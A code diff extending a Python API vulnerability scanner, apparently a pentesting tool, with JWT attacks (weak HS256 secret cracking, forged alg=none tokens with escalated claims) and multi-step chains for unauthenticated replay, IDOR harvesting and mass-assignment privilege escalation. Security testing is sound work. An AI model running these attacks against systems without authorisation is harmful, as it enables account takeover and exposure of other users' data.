+                            endpoint=endpoint_data['endpoint'], method='POST',
+                            vuln_type='Verbose Error / Stack Trace Disclosure', severity='MEDIUM',
+                            description=f'Malformed input triggers a {tech} stack trace',
+                            payload=body[:80], response_code=response.status_code,
+                            evidence=f'Pattern: {pattern}',
+                            remediation='Return generic error bodies; log details server-side only.'
+                        )
+                        print(f"{Colors.YELLOW}[!] {tech} stack trace disclosed by {endpoint_data['endpoint']}{Colors.END}")
+                        return
+            except Exception:
+                pass
+
+    def test_jwt_attacks(self):
+        """Extended JWT battery: none-variants, blank signature, weak HS256 secrets"""
+        auth_header = self.headers.get('Authorization') or self.headers.get('authorization', '')
+        if 'Bearer' not in auth_header:
+            return
+        token = auth_header.split('Bearer', 1)[1].strip()
+        parts = token.split('.')
+        if len(parts) != 3:
+            return
+
+        print(f"{Colors.CYAN}[*] Testing JWT attack vectors (none-variants, weak secrets)...{Colors.END}")
+
+        def b64url_decode(segment: str) -> bytes:
+            return base64.urlsafe_b64decode(segment + '=' * (-len(segment) % 4))
+
+        def b64url_encode(raw: bytes) -> str:
+            return base64.urlsafe_b64encode(raw).decode().rstrip('=')
+
+        try:
+            header = json.loads(b64url_decode(parts[0]))
+            payload_claims = json.loads(b64url_decode(parts[1]))
+        except Exception:
+            return
+
+        # -- Weak HS256 secret check (offline, no requests needed) -----
+        if header.get('alg', '').upper() == 'HS256':
+            signing_input = f'{parts[0]}.{parts[1]}'.encode()
+            provided_sig = parts[2]
+            for secret in self.payloads['weak_jwt_secrets']:
+                candidate = b64url_encode(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
+                if hmac.compare_digest(candidate, provided_sig):
+                    self._add_finding(
+                        endpoint=self.base_url, method='N/A',
+                        vuln_type='JWT Signed with Weak Secret', severity='CRITICAL',
+                        description=f'Session JWT is signed with the guessable secret "{secret}" -- tokens can be forged offline',
+                        payload=f'HS256 secret: {secret}', response_code=0,
+                        evidence='Recomputed signature matches the live token',
+                        remediation='Use a long random signing key (or asymmetric RS256/ES256); rotate immediately.'
+                    )
+                    print(f"{Colors.RED}[!] JWT secret cracked: \"{secret}\" -- tokens forgeable{Colors.END}")
+                    break
+
+        # -- alg:none variants against live endpoints ------------------
+        forged_claims = dict(payload_claims)
+        for key in ('role', 'roles', 'isAdmin', 'is_admin', 'admin', 'scope'):
+            if key in forged_claims:
+                forged_claims[key] = 'admin' if isinstance(forged_claims[key], str) else True
+        none_variants = ['none', 'None', 'NONE', 'nOnE']
+        targets = [e for e in self.endpoints if e.get('status') in (200, 201)][:5]
+
+        for variant in none_variants:
+            forged = (b64url_encode(json.dumps({'alg': variant, 'typ': 'JWT'}).encode())
+                      + '.' + b64url_encode(json.dumps(forged_claims).encode()) + '.')
+            test_headers = self.headers.copy()
+            test_headers['Authorization'] = f'Bearer {forged}'
+            for endpoint_data in targets:
+                try:
+                    response = self.session.request(
+                        endpoint_data['method'], f"{self.base_url}{endpoint_data['endpoint']}",
+                        headers=test_headers, timeout=10, verify=False, proxies=self.proxy)
+                    if response.status_code in (200, 201, 204):
+                        self._add_finding(
+                            endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
+                            vuln_type='JWT Algorithm Confusion (alg=none)', severity='CRITICAL',
+                            description=f'Unsigned JWT with alg="{variant}" and escalated claims accepted',
+                            payload=forged[:120], response_code=response.status_code,
+                            evidence=f'alg={variant} token accepted with modified claims',
+                            remediation='Pin the expected algorithm server-side; reject unsigned tokens.'
+                        )
+                        print(f"{Colors.RED}[!] alg={variant} JWT accepted on {endpoint_data['endpoint']}{Colors.END}")
+                        return
+                except Exception:
+                    pass
+
+    # ==================================================================
+    # Attack chains -- multi-step scenarios that mirror real API abuse
+    # ==================================================================
+
+    def run_attack_chains(self):
+        """Execute multi-step attack chains against the discovered surface"""
+        print(f"\n{Colors.BOLD}[+] Phase 4: Attack Chain Execution{Colors.END}")
+        self.chain_unauth_replay()
+        self.chain_idor_harvest()
+        self.chain_mass_assignment_persist()
+
+    def chain_unauth_replay(self):
+        """
+        Chain 1 (Broken Authentication): replay every endpoint that answered
+        200 WITH credentials, using a bare session with no auth headers or
+        cookies. A matching response means the credential check is cosmetic.
+        """
+        if not self.headers and not self.cookies:
+            print(f"{Colors.YELLOW}[*] Chain 1 (unauth replay): skipped -- no credentials were supplied to strip{Colors.END}")
+            return
+
+        print(f"{Colors.CYAN}[*] Chain 1: Unauthenticated replay of authenticated endpoints...{Colors.END}")
+        bare = requests.Session()
+
+        authed_ok = [e for e in self.endpoints if e.get('status') in (200, 201)][:20]
+        for endpoint_data in authed_ok:
+            try:
+                response = bare.request(
+                    endpoint_data['method'], f"{self.base_url}{endpoint_data['endpoint']}",
+                    timeout=10, verify=False, allow_redirects=False, proxies=self.proxy)
+                if response.status_code in (200, 201, 204):
+                    same_shape = abs(len(response.content) - endpoint_data.get('length', 0)) < 30
+                    self._add_finding(
+                        endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
+                        vuln_type='Broken Authentication (Unauthenticated Access)',
+                        severity='CRITICAL' if same_shape else 'HIGH',
+                        description='Endpoint returns success without any credentials',
+                        payload='(auth headers and cookies stripped)', response_code=response.status_code,
+                        evidence=f'Unauth {response.status_code}, {len(response.content)} bytes '
+                                 f'(authed was {endpoint_data.get("length", "?")} bytes)',
+                        remediation='Enforce authentication on every route server-side; deny by default.'
+                    )
+                    print(f"{Colors.RED}[!] No auth required: {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
+            except Exception:
+                pass
+
+    def chain_idor_harvest(self):
+        """
+        Chain 2 (BOLA/IDOR): IDs harvested from real responses are substituted
+        into object-style paths (/api/users/<id>), plus numeric neighbors of
+        each harvested ID. Distinct 200-bodies across IDs = object-level
+        authorization failure.
+        """
+        print(f"{Colors.CYAN}[*] Chain 2: BOLA/IDOR harvest -- {len(self.harvested_ids)} IDs collected during discovery...{Colors.END}")
+
+        # Build candidate IDs: harvested + numeric neighbors
+        candidates = set(list(self.harvested_ids)[:15])
+        for harvested in list(self.harvested_ids)[:10]:
+            if str(harvested).isdigit():
+                value = int(harvested)
+                candidates.update(str(v) for v in (value - 1, value + 1) if v >= 0)
+        if not candidates:
+            candidates = {'1', '2', '3'}
+
+        collection_endpoints = [e for e in self.endpoints
+                                if e['method'] == 'GET' and e.get('status') == 200
+                                and re.search(r'/(users|orders|accounts|products|documents|files|invoices|profiles|customers)$',
+                                              e['endpoint'])][:5]
+        if not collection_endpoints:
+            print(f"{Colors.YELLOW}[*] No collection-style endpoints to pivot on -- skipping{Colors.END}")
+            return
+
+        for endpoint_data in collection_endpoints:
+            bodies = {}
+            for object_id in sorted(candidates)[:8]:
+                object_path = f"{endpoint_data['endpoint']}/{object_id}"
+                try:
+                    response = self.session.get(f"{self.base_url}{object_path}",
+                                                timeout=10, verify=False, proxies=self.proxy)
+                    if response.status_code == 200 and response.content:
+                        bodies[object_path] = response.content[:500]
+                except Exception:
+                    pass
+            distinct = len(set(bodies.values()))
+            if distinct > 1:
+                self._add_finding(
+                    endpoint=endpoint_data['endpoint'] + '/{id}', method='GET',
+                    vuln_type='BOLA / IDOR via Harvested Object IDs', severity='HIGH',
+                    description=f'{distinct} distinct objects readable by iterating IDs harvested from API responses',
+                    payload=', '.join(list(bodies.keys())[:5]), response_code=200,
+                    evidence=f'{len(bodies)} object fetches succeeded with {distinct} distinct bodies',
+                    remediation='Check object ownership on every fetch; use non-guessable IDs as defense in depth.'
+                )
+                print(f"{Colors.RED}[!] BOLA chain: {distinct} distinct objects readable under {endpoint_data['endpoint']}/{{id}}{Colors.END}")
+
+    def chain_mass_assignment_persist(self):
+        """
+        Chain 3 (Mass Assignment, verified): GET an object, inject privilege
+        fields, write it back with PUT/PATCH, then GET it AGAIN to confirm the
+        escalation persisted -- reflection alone can be a false positive.
+        """
+        print(f"{Colors.CYAN}[*] Chain 3: Mass-assignment persistence (GET -> tamper -> PUT -> GET)...{Colors.END}")
+
+        writable = [e for e in self.endpoints
+                    if e.get('has_json') and isinstance(e.get('json_data'), dict)
+                    and e['method'] == 'GET' and e.get('status') == 200][:5]
+        if not writable:
+            print(f"{Colors.YELLOW}[*] No JSON GET endpoints to pivot on -- skipping{Colors.END}")
+            return
+
+        privilege_fields = {'role': 'admin', 'is_admin': True, 'isAdmin': True, 'verified': True}
+
+        for endpoint_data in writable:
+            url = f"{self.base_url}{endpoint_data['endpoint']}"
+            tampered = copy.deepcopy(endpoint_data['json_data'])
+            tampered.update(privilege_fields)
+
+            for write_method in ('PUT', 'PATCH'):
+                try:
+                    write_response = self.session.request(write_method, url, json=tampered,
+                                                          timeout=10, verify=False, proxies=self.proxy)
+                    if write_response.status_code not in (200, 201, 204):
+                        continue
+                    # Verification read
+                    verify_response = self.session.get(url, timeout=10, verify=False, proxies=self.proxy)
+                    try:
+                        current = verify_response.json()
+                    except ValueError:
+                        continue
+                    persisted = [k for k, v in privilege_fields.items()
+                                 if isinstance(current, dict) and current.get(k) == v
+                                 and endpoint_data['json_data'].get(k) != v]
+                    if persisted:
+                        self._add_finding(
+                            endpoint=endpoint_data['endpoint'], method=write_method,
+                            vuln_type='Mass Assignment (Persisted Privilege Escalation)', severity='CRITICAL',
+                            description=f'Privilege fields {persisted} written via {write_method} and confirmed on re-read',
+                            payload=json.dumps({k: privilege_fields[k] for k in persisted}),
+                            response_code=write_response.status_code,
+                            evidence=f'Fields {persisted} persisted across GET -> {write_method} -> GET',
+                            remediation='Bind writes to an explicit allow-list DTO; never merge raw request bodies into models.'
+                        )
+                        print(f"{Colors.RED}[!] Mass assignment PERSISTED on {endpoint_data['endpoint']}: {persisted}{Colors.END}")
+                        break
+                except Exception:
+                    pass
+
     def test_security_headers(self):
         """Test for missing security headers"""
         print(f"\n{Colors.YELLOW}[*] Testing Security Headers...{Colors.END}")
@@ -1350,45 +2177,65 @@ class APIVulnScanner:
     def run_full_scan(self, wordlist: List[str] = None):
         """Execute complete vulnerability scan"""
         self.print_banner()
-        
-        # Phase 1: Discovery
-        self.discover_endpoints(wordlist)
-        
+
+        # Phase 0: Passive recon -- fingerprints, CORS, robots.txt, API specs
+        extra_paths = self.recon_target()
+
+        # Phase 1: Discovery (wordlist + spec/robots-derived paths)
+        self.discover_endpoints(wordlist, extra_paths=extra_paths)
+
         if not self.endpoints:
             print(f"{Colors.RED}[!] No endpoints discovered. Exiting.{Colors.END}")
             return
-        
-        # Phase 2: Vulnerability Testing
-        print(f"\n{Colors.BOLD}[+] Phase 3: OWASP Top 10 Vulnerability Testing{Colors.END}")
-        
+
+        # Phase 1b: Shadow/legacy API version sweep
+        self.enumerate_api_versions()
+
+        # Phase 2/3: Per-endpoint vulnerability testing
+        print(f"\n{Colors.BOLD}[+] Phase 3: OWASP API Top 10 Vulnerability Testing{Colors.END}")
+
         for endpoint_data in self.endpoints:
             print(f"\n{Colors.CYAN}[*] Testing: {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
-            
+
+            # Gated endpoints get the bypass battery instead of param fuzzing
+            self.test_403_bypass(endpoint_data)
+
             # Fuzz parameters
             params = self.fuzz_parameters(endpoint_data)
-            
+
             if params:
                 # Run all vulnerability tests
                 self.test_sql_injection(endpoint_data, params)
+                self.test_nosql_injection(endpoint_data, params)
                 self.test_xss(endpoint_data, params)
+                self.test_ssti(endpoint_data, params)
                 self.test_command_injection(endpoint_data, params)
                 self.test_path_traversal(endpoint_data, params)
                 self.test_ssrf(endpoint_data, params)
                 self.test_idor(endpoint_data, params)
-            
-            # Test XXE regardless of parameters
+
+            # Body/method-level tests that don't need fuzzed params
             self.test_xxe(endpoint_data)
-            
+            self.test_http_method_override(endpoint_data)
+            self.test_verbose_errors(endpoint_data)
+
             # Test API data manipulation for POST/PUT/PATCH endpoints with JSON
             if endpoint_data.get('has_json'):
                 self.test_api_data_manipulation(endpoint_data)
-        
-        # Phase 3: Additional API-specific tests
+
+        # Phase 3b: API-wide tests
         self.test_graphql_introspection()
         self.test_authentication_bypass()
+        self.test_jwt_attacks()
         self.test_rate_limiting()
         self.test_security_headers()
-        
+
+        # Phase 4: Multi-step attack chains
+        if self.skip_chains:
+            print(f"\n{Colors.YELLOW}[*] Attack chains skipped (--skip-chains){Colors.END}")
+        else:
+            self.run_attack_chains()
+
         # Generate report
         self.generate_report()
 
@@ -1481,9 +2328,10 @@ class APIVulnScanner:
     def _save_report_to_file(self, sorted_findings: List[Finding], summary: Dict):
         """Save findings to JSON and HTML files"""
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        
+        os.makedirs(self.output_dir, exist_ok=True)
+
         # JSON Report
-        json_filename = f"/mnt/user-data/outputs/api_scan_{timestamp}.json"
+        json_filename = os.path.join(self.output_dir, f"api_scan_{timestamp}.json")
         json_data = {
             'scan_info': {
                 'target': self.base_url,
@@ -1491,18 +2339,21 @@ class APIVulnScanner:
                 'total_vulnerabilities': len(self.findings),
                 'endpoints_analyzed': len(self.endpoints),
                 'json_patterns_discovered': len(self.json_patterns),
-                'cookies_used': bool(self.cookies)
+                'cookies_used': bool(self.cookies),
+                'tech_fingerprints': sorted(self.tech_fingerprints),
+                'api_specs_found': self.api_schemas,
+                'harvested_object_ids': len(self.harvested_ids)
             },
             'summary': summary,
             'findings': [asdict(f) for f in sorted_findings],
             'json_patterns': self.json_patterns[:10]  # Include first 10 patterns
         }
-        
+
         with open(json_filename, 'w') as f:
             json.dump(json_data, f, indent=2)
-        
+
         # HTML Report
-        html_filename = f"/mnt/user-data/outputs/api_scan_{timestamp}.html"
+        html_filename = os.path.join(self.output_dir, f"api_scan_{timestamp}.html")
         html_content = self._generate_html_report(sorted_findings, summary)
         
         with open(html_filename, 'w') as f:
@@ -1632,12 +2483,7 @@ class APIVulnScanner:
 
 
 def main():
-    banner = f"""
-{Colors.CYAN}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
-║           API VULNERABILITY SCANNER v2.0 - Ghost Ops Security             ║
-║        Advanced OWASP API Security Testing with Pattern Analysis          ║
-╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}
-"""
+    banner = f"{Colors.ORANGE}{GHOST_BANNER}{Colors.END}{Colors.GREY}{GHOST_TAGLINE}{Colors.END}\n"
     
     parser = argparse.ArgumentParser(
         description=banner,
@@ -1717,6 +2563,10 @@ For version comparison, see: VERSION_COMPARISON.txt{Colors.END}
     parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
     parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
     parser.add_argument('--cookie', help='Cookie string (e.g., "session=abc123;user=admin")')
+    parser.add_argument('-o', '--output-dir', default='./reports',
+                        help='Directory for JSON/HTML reports (default: ./reports)')
+    parser.add_argument('--skip-chains', action='store_true',
+                        help='Skip Phase 4 multi-step attack chains (unauth replay, BOLA harvest, mass-assignment persistence)')
     
     args = parser.parse_args()
     
@@ -1760,7 +2610,9 @@ For version comparison, see: VERSION_COMPARISON.txt{Colors.END}
         headers=headers,
         proxy=proxy,
         threads=args.threads,
-        cookies=cookies
+        cookies=cookies,
+        output_dir=args.output_dir,
+        skip_chains=args.skip_chains
     )
     
     try:
